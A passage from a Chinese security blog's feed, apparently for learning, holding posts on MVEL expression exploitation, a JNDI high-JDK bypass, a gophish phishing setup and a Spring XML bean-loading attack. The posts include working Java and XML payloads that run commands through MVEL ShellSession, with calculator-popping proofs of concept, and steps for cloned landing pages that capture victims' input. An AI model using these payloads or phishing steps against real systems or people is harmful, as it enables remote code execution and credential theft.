                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223907924.png"
                      class="" title="image-20250313223907924"
                > 

<p>最后走向我们的MVEL的eval函数利用点</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313224034230.png"
                      class="" title="image-20250313224034230"
                > 

<p>最后弹出了计算器。</p>
<h3 id="paylaod分析"><a href="#paylaod分析" class="headerlink" title="paylaod分析"></a>paylaod分析</h3><ul>
<li>首先我们需要用到类pushContext，又因为他获取这个类是从map里面get(key)提取的，push-&gt;pushContext，所以我们的恶意字符串第一个参数要为push，然后第二个参数是我们的恶意代码，恶意代码跟push会根据空格分开<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313224215688.png"
                      class="" title="image-20250313224215688"
                > </li>
<li>然后为什么不直接用open -a Calculator呢，因为这个命令中间也有空格，那参数就会被分开，所以需要转换为ascall码对应的字符串去拼接，就是中间不能出现空格<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313224342726.png"
                      class="" title="image-20250313224342726"
                ></li>
</ul>
<h2 id="JNDI高版本绕过中的应用"><a href="#JNDI高版本绕过中的应用" class="headerlink" title="JNDI高版本绕过中的应用"></a>JNDI高版本绕过中的应用</h2><p>绕过原理参考我的另一篇文章 <a href="https://ro0ki1.github.io/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/">https://ro0ki1.github.io/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</a></p>
<p>我默认各位已经知道原理了，那就非常好修改paylaod了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250314192716730.png"
                      class="" title="image-20250314192716730"
                > 

<p>由前面的学习可以知道这三个参数分别是我们会用到的类，还有类的方法，以及方法里面的参数</p>
<p>那我们上面学习MVEL学习到了ShellSession类，他的exec方法是public，他的参数是String类型的，我们想要利用只需要参数是<strong>push 恶意命令执行代码（恶意代码中间不能有空格）</strong> ,即可实现**ShellSession.exec(“push 恶意代码”)**这样的调用</p>
<p>虽然在ldap里面他是利用反射的形式<strong>exec.invoker(org.mvel2.sh.ShellSession,恶意代码)</strong>  </p>
<p>那我们修改payload就只要修改这三个部份</p>
<h3 id="服务端代码"><a href="#服务端代码" class="headerlink" title="服务端代码"></a>服务端代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line">import org.mvel2.sh.ShellSession;</span><br><span class="line"></span><br><span class="line">import javax.naming.StringRefAddr;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class JNDI_ShellSession &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(&quot;org.mvel2.sh.ShellSession&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">                true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line"></span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=exec&quot;));</span><br><span class="line"></span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;push Runtime.getRuntime().exec(String.valueOf((char)111)+String.valueOf((char)112)+String.valueOf((char)101)+String.valueOf((char)110)+String.valueOf((char)32)+String.valueOf((char)45)+String.valueOf((char)97)+String.valueOf((char)32)+String.valueOf((char)67)+String.valueOf((char)97)+String.valueOf((char)108)+String.valueOf((char)99)+String.valueOf((char)117)+String.valueOf((char)108)+String.valueOf((char)97)+String.valueOf((char)116)+String.valueOf((char)111)+String.valueOf((char)114));&quot;));</span><br><span class="line">//        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(&quot;el&quot;, referenceWrapper);</span><br><span class="line">        System.out.println(&quot;rmi://127.0.0.1:1099/el&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行测试一下看看</p>
<h3 id="客户端连接代码"><a href="#客户端连接代码" class="headerlink" title="客户端连接代码"></a>客户端连接代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        Object lookup = new InitialContext().lookup(&quot;rmi://127.0.0.1:1099/el&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250314193326039.png"
                      class="" title="image-20250314193326039"
                > 

<p>成功绕过jdk高版本限制实现命令执行。</p>
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2025/03/11/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>gophish钓鱼平台使用</title>
    <url>/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Gophish是为企业和渗透测试人员设计的开源网络钓鱼工具包。 它提供了快速，轻松地设置和执行网络钓鱼攻击以及安全意识培训的能力。</p>
<p>gophish自带web面板，对于邮件编辑、网站克隆、数据可视化、批量发送等功能的使用带来的巨大的便捷，并且在功能上实现分块，令钓鱼初学者能够更好理解钓鱼工作各部分的原理及运用。</p>
<h2 id="gophish的安装配置"><a href="#gophish的安装配置" class="headerlink" title="gophish的安装配置"></a>gophish的安装配置</h2><p><a class="link"   href="https://github.com/gophish/gophish" >https://github.com/gophish/gophish<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>下载地址</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用wget下载安装包</span><br><span class="line">wget https://github.com/gophish/gophish/releases/download/v0.10.1/gophish-v0.10.1-linux-32bit.zip</span><br><span class="line"></span><br><span class="line">wget https://github.com/gophish/gophish/releases/download/v0.10.1/gophish-v0.10.1-linux-64bit.zip</span><br><span class="line"></span><br><span class="line">#解压</span><br><span class="line">mkdir gophish</span><br><span class="line">unzip gophish-v0.10.1-linux-64bit.zip -d ./gophish</span><br><span class="line"></span><br><span class="line">#修改配置文件</span><br><span class="line">cd gophish</span><br><span class="line">vim config.json</span><br></pre></td></tr></table></figure></div>

<p>下载好了之后修改config.json</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325161203441.png"
                      class="" title="image-20250325161203441"
                > 

<p>修改0.0.0.0，就可以坚听所有的访问，我们可以远程访问web界面</p>
<p><a class="link"   href="https://ip:3333/" >https://ip:3333/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>账号密码: admin&#x2F;gophish</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325161538096.png"
                      class="" title="image-20250325161538096"
                > 

<p>登录进去后</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325161634326.png"
                      class="" title="image-20250325161634326"
                > 

<h2 id="Users-Groups"><a href="#Users-Groups" class="headerlink" title="Users &amp; Groups"></a>Users &amp; Groups</h2><p>这里是用来配置我们将来要钓鱼的人的信息的</p>
<h3 id="单独添加目标邮箱"><a href="#单独添加目标邮箱" class="headerlink" title="单独添加目标邮箱"></a>单独添加目标邮箱</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325161743041.png"
                      class="" title="image-20250325161743041"
                > 

<p>输入我们要发送给目标的邮箱地址，一个一个输入的话记得点add</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325161819758.png"
                      class="" title="image-20250325161819758"
                > 

<p>这才是添加成功的样子</p>
<h3 id="批量添加目标邮箱"><a href="#批量添加目标邮箱" class="headerlink" title="批量添加目标邮箱"></a>批量添加目标邮箱</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325161904743.png"
                      class="" title="image-20250325161904743"
                > 

<p>先选择下载模版</p>
<p>然后编辑csv文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162006234.png"
                      class="" title="image-20250325162006234"
                > 

<p>添加目标邮箱</p>
<p>然后导入</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162112090.png"
                      class="" title="image-20250325162112090"
                > 

<p>这里就设置目标成功了</p>
<h2 id="Email-Templates"><a href="#Email-Templates" class="headerlink" title="Email Templates"></a>Email Templates</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162223620.png"
                      class="" title="image-20250325162223620"
                > 

<p>这里有一个import email，导入邮箱模版的，我们可以先给自己发一封钓鱼邮件然后下载他，然后粘贴上来</p>
<h3 id="邮件模版生成"><a href="#邮件模版生成" class="headerlink" title="邮件模版生成"></a>邮件模版生成</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162517050.png"
                      class="" title="image-20250325162517050"
                > 

<p><strong>我们可以附上我们的恶意链接。此时模版的链接后面会被替换掉</strong> ，链接需要用邮件的格式的，不是自己写一个<a class="link"   href="http://www.baidu.com就可以被替换的/" >http://www.baidu.com就可以被替换的<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162829310.png"
                      class="" title="image-20250325162829310"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162931412.png"
                      class="" title="image-20250325162931412"
                > 

<p>然后发送给自己</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163050976.png"
                      class="" title="image-20250325163050976"
                > 

<p>接收到的邮件我们点击最右边那个</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163137803.png"
                      class="" title="image-20250325163137803"
                > 

<p>导出为eml文件，然后将文件转换为txt格式</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163221120.png"
                      class="" title="image-20250325163221120"
                > 

<p>将内容复制进import templates里面</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163246272.png"
                      class="" title="image-20250325163246272"
                > 

<p>我后面换了个文案，好像我的乱码有点多哈哈哈哈</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163500431.png"
                      class="" title="image-20250325163500431"
                > 

<p>蓝色的就是链接</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163539238.png"
                      class="" title="image-20250325163539238"
                > 

<p>模版生成成功了</p>
<h2 id="Sending-Profiles"><a href="#Sending-Profiles" class="headerlink" title="Sending Profiles"></a>Sending Profiles</h2><p>配置发送邮件的邮箱</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163745551.png"
                      class="" title="image-20250325163745551"
                > 

<h3 id="授权码获得地址"><a href="#授权码获得地址" class="headerlink" title="授权码获得地址"></a>授权码获得地址</h3><p>账号与安全</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163829319.png"
                      class="" title="image-20250325163829319"
                > 

<p>安全设置</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163855977.png"
                      class="" title="image-20250325163855977"
                > 

<p>开启服务</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163907423.png"
                      class="" title="image-20250325163907423"
                > 

<p>设备管理、授权码管理</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163940226.png"
                      class="" title="image-20250325163940226"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164044782.png"
                      class="" title="image-20250325164044782"
                > 

<p>可以测试一下看看是否可以发送成功</p>
<h2 id="Landing-Pages"><a href="#Landing-Pages" class="headerlink" title="Landing Pages"></a>Landing Pages</h2><p>这个模块是用来伪造页面的</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164152096.png"
                      class="" title="image-20250325164152096"
                > 

<p>这里会让我们填写一个url</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164238610.png"
                      class="" title="image-20250325164238610"
                > 

<p>伪造一下老美的</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164259789.png"
                      class="" title="image-20250325164259789"
                > 

<p>就可以构造一个老美的页面了</p>
<h2 id="Campaigns"><a href="#Campaigns" class="headerlink" title="Campaigns"></a>Campaigns</h2><p>配置任务</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164611276.png"
                      class="" title="image-20250325164611276"
                > 

<p>配置好了之后发送</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164819733.png"
                      class="" title="image-20250325164819733"
                > 

<p>收到了邮件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164838362.png"
                      class="" title="image-20250325164838362"
                > 

<p>点击下那个链接，我也不知道为啥是乱码的，好奇怪这次</p>
<p><strong>Tips</strong> 替换的链接是需要这里配置的，而不是我们直接在邮件里面写好的<a class="link"   href="http://www.baidu.com那样/" >http://www.baidu.com那样<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162829310.png"
                      class="" title="image-20250325162829310"
                > 

<p>是需要这种地方添加的</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164914545.png"
                      class="" title="image-20250325164914545"
                > 

<p>是一个老美的网站的界面</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164944070.png"
                      class="" title="image-20250325164944070"
                > 

<p>统计到了我点击了恶意链接。然后也能接受数据。如果是个登录界面用户输入了不该输入的参数</p>
]]></content>
      <tags>
        <tag>gophish</tag>
      </tags>
  </entry>
  <entry>
    <title>spring框架bean加载漏洞</title>
    <url>/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>在Spring框架中，<strong>Bean</strong> 是一个非常重要的概念，它是Spring框架的核心组件之一。以下是对Bean的详细解释：</p>
<h3 id="1-Bean的定义"><a href="#1-Bean的定义" class="headerlink" title="1. Bean的定义"></a>1. Bean的定义</h3><p>Bean是Spring框架中被管理的对象，通常是一个普通的Java类（POJO，Plain Old Java Object）。Spring通过依赖注入（DI）和控制反转（IoC）的机制来管理这些对象的生命周期、依赖关系和配置信息。</p>
<h3 id="2-Bean的作用"><a href="#2-Bean的作用" class="headerlink" title="2. Bean的作用"></a>2. Bean的作用</h3><p>Bean在Spring框架中扮演着多种角色：</p>
<ul>
<li><strong>业务逻辑实现</strong>：Bean可以是实现具体业务逻辑的类，例如Service层的类，负责处理业务流程。</li>
<li><strong>数据访问</strong>：Bean可以是数据访问层的类，例如DAO（Data Access Object）类，用于与数据库进行交互。</li>
<li><strong>配置管理</strong>：Bean可以是配置类，用于定义应用程序的配置信息。</li>
<li><strong>工具类</strong>：Bean也可以是工具类，提供一些通用的功能，例如日志记录、文件操作等。</li>
</ul>
<h3 id="3-Bean的生命周期"><a href="#3-Bean的生命周期" class="headerlink" title="3. Bean的生命周期"></a>3. Bean的生命周期</h3><p>Spring框架对Bean的生命周期进行了严格的管理，主要包括以下几个阶段：</p>
<ul>
<li><strong>实例化</strong>：Spring容器根据配置信息创建Bean的实例。</li>
<li><strong>属性赋值</strong>：Spring容器将配置文件中定义的属性值注入到Bean实例中。</li>
<li><strong>初始化</strong>：如果Bean实现了<code>InitializingBean</code>接口或定义了<code>init-method</code>，Spring容器会调用初始化方法。</li>
<li><strong>使用</strong>：Bean实例被应用程序使用，执行业务逻辑。</li>
<li><strong>销毁</strong>：当Spring容器关闭时，如果Bean实现了<code>DisposableBean</code>接口或定义了<code>destroy-method</code>，Spring容器会调用销毁方法。</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>高版本的Spring框架需要<strong>JDK17</strong> </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt; &lt;!-- 替换为你的目标版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<p>一般spring系统都会带有相关的依赖可以支持我们通过xml文件去加载bean，依赖不一定是上面这个</p>
<p><strong>能shell的类</strong> </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mvel&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mvel2&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.4.4.Final&lt;/version&gt; &lt;!-- 你可以根据需要选择其他版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<p>这里我选择MVEL，我前面文章也有写MVEL依赖如何实现命令执行，他有多种方式可以实现</p>
<p>参考链接 <a href="https://ro0ki1.github.io/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/">https://ro0ki1.github.io/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</a> </p>
<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.springframework.context.ApplicationContext;</span><br><span class="line">import org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line">public class Bean_test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;test.xml&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="漏洞xml配置文件"><a href="#漏洞xml配置文件" class="headerlink" title="漏洞xml配置文件"></a>漏洞xml配置文件</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;jndi&quot; class=&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot; init-method=&quot;getObject&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;targetObject&quot;&gt;</span><br><span class="line">            &lt;bean class=&quot;org.mvel2.sh.ShellSession&quot;/&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;targetMethod&quot; value=&quot;exec&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;arguments&quot;</span><br><span class="line">                  value=&quot;push Runtime.getRuntime().exec(String.valueOf((char)111)+String.valueOf((char)112)+String.valueOf((char)101)+String.valueOf((char)110)+String.valueOf((char)32)+String.valueOf((char)45)+String.valueOf((char)97)+String.valueOf((char)32)+String.valueOf((char)67)+String.valueOf((char)97)+String.valueOf((char)108)+String.valueOf((char)99)+String.valueOf((char)117)+String.valueOf((char)108)+String.valueOf((char)97)+String.valueOf((char)116)+String.valueOf((char)111)+String.valueOf((char)114));&quot;/&gt;</span><br><span 